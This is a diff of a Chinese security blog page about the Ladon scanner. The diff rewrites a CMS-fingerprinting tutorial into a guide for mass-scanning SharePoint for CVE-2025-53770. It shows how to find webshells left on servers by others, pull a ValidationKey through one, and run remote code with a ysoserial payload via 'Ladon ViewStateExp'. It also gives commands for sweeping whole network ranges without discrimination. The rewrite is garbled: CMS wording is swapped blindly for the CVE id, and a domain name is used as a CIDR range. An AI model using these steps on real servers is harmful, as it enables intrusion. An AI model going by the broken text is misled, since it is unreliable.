@@ -22,10 +22,8 @@
 <meta name="description" content=" 
 
 
-Ladon信息收集、资产探测、WhatCMS识别SharePoint
-
-模块名称
-WhatCMS、CMS、CmsInfo等，Cobalt Strike下用法一致，输入URL，仅识别URL...">
+cve-2025-53770识别 SharePoint
+cve-2025-53770、cve-2025-53770、cve-2025-53770Info等，Cobalt Strike下用...">
 
 
 <meta name="robots" content="all">
@@ -36,7 +34,7 @@ WhatCMS、CMS、CmsInfo等，Cobalt Strike下用法一致，输入URL，仅识�
 
 <title>
     
-    Ladon 资产探测 CMS识别 SharePoint |
+    Ladon SharePoint CVE-2025-53770漏洞批量检测 |
     
     K8哥哥’s Blog
 </title>
@@ -157,7 +155,7 @@ WhatCMS、CMS、CmsInfo等，Cobalt Strike下用法一致，输入URL，仅识�
     
     <article class="post">
     <h1 class="post-head">
-        Ladon 资产探测 CMS识别 SharePoint
+        Ladon SharePoint CVE-2025-53770漏洞批量检测
     </h1>
     <div class="post-body">
         <p style="color:#fff;"> 
@@ -167,35 +165,38 @@ Visit <span id="busuanzi_value_page_pv"></span>
 </span>
 %&gt;
 </p>
-<p>Ladon信息收集、资产探测、WhatCMS识别SharePoint</p>
-<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/cms/sharepoint.png"></p>
-<h3 id="模块名称">模块名称</h3>
-<p>WhatCMS、CMS、CmsInfo等，Cobalt Strike下用法一致，输入URL，仅识别URL对应指纹，输入非URL时，会探测常见CMS网站、网络设备、打印机、路由器、防火墙、VPN等，由于端口多速度慢，但收集的资产会更全(前提是目标有)</p>
-<h3 id="指定URL">指定URL</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CMS</span><br><span class="line">Ladon http://192.168.1.8 WhatCMS</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="cve-2025-53770识别-SharePoint">cve-2025-53770识别 SharePoint</h3>
+<p>cve-2025-53770、cve-2025-53770、cve-2025-53770Info等，Cobalt Strike下用法一致，输入URL，仅识别URL对应指纹，输入非URL时，会探测常见cve-2025-53770网站、网络设备、打印机、路由器、防火墙、VPN等，由于端口多速度慢，但收集的资产会更全(前提是目标有)</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://k8gege.org cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h4 id="SharePoint-版本探测">SharePoint 版本探测</h4>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 SharePointVer</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://k8gege.org SharePointVer</span><br></pre></td></tr></tbody></table></figure>
 <p>结果如下</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Load SharePointVer</span><br><span class="line">http://192.168.1.8  SharePoint: 16.0.0.5513 NET: 4.0.30319</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2025-07-28 08:09:39</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">### 指定IP</span><br><span class="line">```bash</span><br><span class="line">Ladon 192.168.1.8 CMS</span><br><span class="line">Ladon 192.168.1.8 WhatCMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Load SharePointVer</span><br><span class="line">http://k8gege.org  SharePoint: 16.0.0.5513 NET: 4.0.30319</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2025-07-28 08:09:39</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">![使用http访问查看图片](/k8img/Ladon/cms/sharepoint.png)</span><br><span class="line"></span><br><span class="line">#### SharePoint CVE-2025-53770后门检测</span><br><span class="line"></span><br><span class="line">根据公开资料，对SharePoint服务器进行扫描，还是能检到一此webshell</span><br><span class="line">![使用http访问查看图片](/k8img/Ladon/poc/door53770scan.png)</span><br><span class="line"></span><br><span class="line">访问 可获取 ValidationKey</span><br><span class="line">![使用http访问查看图片](/k8img/Ladon/poc/door53770.png)</span><br><span class="line"></span><br><span class="line">ysoserial 生成反序列化payload 使用Ladon ViewStateExp执行RCE</span><br><span class="line">![使用http访问查看图片](/k8img/Ladon/poc/door53770cmd.png)</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">Ladon ViewStateExp http://k8gege.org/_layouts/15/default.aspx payload.txt</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="CVE-2025-53770-漏洞检测">CVE-2025-53770 漏洞检测</h2>
+<h3 id="指定URL">指定URL</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://k8gege.org cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/poc/cve-2025-53770.png"></p>
+<h3 id="指定IP">指定IP</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon k8gege.org cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="批量URL">批量URL</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <p>PS：TXT可存放IP、IP:Port、URL等格式</p>
 <h3 id="批量IP">批量IP</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt WhatCMS</span><br><span class="line">Ladon noping ip.txt CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="指定C段">指定C段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/24 CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/24 CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon k8gege.org/24 cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/24 cve-2025-53770</span><br><span class="line"></span><br><span class="line">Ladon k8gege.org/24 cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/24 cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="指定B段">指定B段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/b CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/b CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon k8gege.org/b cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/b cve-2025-53770</span><br><span class="line"></span><br><span class="line">Ladon k8gege.org/b cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/b cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="指定A段">指定A段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a WhatCMS</span><br><span class="line">Ladon noping 192.168.1.8/a CMS</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CMS</span><br><span class="line">Ladon noping 192.168.1.8/a CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon k8gege.org/a cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/a cve-2025-53770</span><br><span class="line"></span><br><span class="line">Ladon k8gege.org/a cve-2025-53770</span><br><span class="line">Ladon noping k8gege.org/a cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="批量C段">批量C段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt CMS</span><br><span class="line">Ladon ipc.txt CMS</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CMS</span><br><span class="line">Ladon noping ipc.txt CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt cve-2025-53770</span><br><span class="line">Ladon ipc.txt cve-2025-53770</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt cve-2025-53770</span><br><span class="line">Ladon noping ipc.txt cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <p>PS: TXT存放多个目标的C段IP</p>
 <h3 id="批量B段">批量B段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt CMS</span><br><span class="line">Ladon noping ip16.txt CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt cve-2025-53770</span><br><span class="line">Ladon noping ip16.txt cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <p>PS: TXT存放多个目标的B段IP</p>
 <h3 id="批量网段">批量网段</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt CMS</span><br><span class="line">Ladon noping cidr.txt CMS</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt cve-2025-53770</span><br><span class="line">Ladon noping cidr.txt cve-2025-53770</span><br></pre></td></tr></tbody></table></figure>
 <p>PS: TXT存放各种IP网段，全网无差别扫描</p>
 <h3 id="更多功能-使用教程">更多功能 使用教程</h3>
 <p><a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></p>
